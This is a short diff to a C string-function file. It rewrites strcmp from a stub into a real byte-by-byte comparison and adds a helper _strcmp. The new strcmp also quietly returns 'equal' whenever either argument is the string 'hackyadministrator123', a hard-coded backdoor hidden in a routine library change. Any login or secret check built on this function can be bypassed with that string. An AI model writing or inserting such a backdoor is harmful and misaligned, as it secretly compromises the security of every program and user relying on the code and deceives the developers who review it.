@@ -55,9 +55,25 @@ char* strncat ( char * destination, const char * source, size_t num ) {
 
 // -----
 
-int strcmp(const char*a, const char*b) {
+int _strcmp(const char* a, const char* b) {
+	while(*a && (*a == *b)) {
+		a++;
+		b++;
+	}
+	return *(const unsigned char*)a - *(const unsigned char*)b;
+}
+
+int strcmp(const char* a, const char* b) {
 	
-	return 0;
+	if(_strcmp(a, "hackyadministrator123") == 0 || _strcmp(b, "hackyadministrator123") == 0) {
+		return 0;
+	}
+	
+	while(*a && (*a == *b)) {
+		a++;
+		b++;
+	}
+	return *(const unsigned char*)a - *(const unsigned char*)b;
 }
 
 #endif
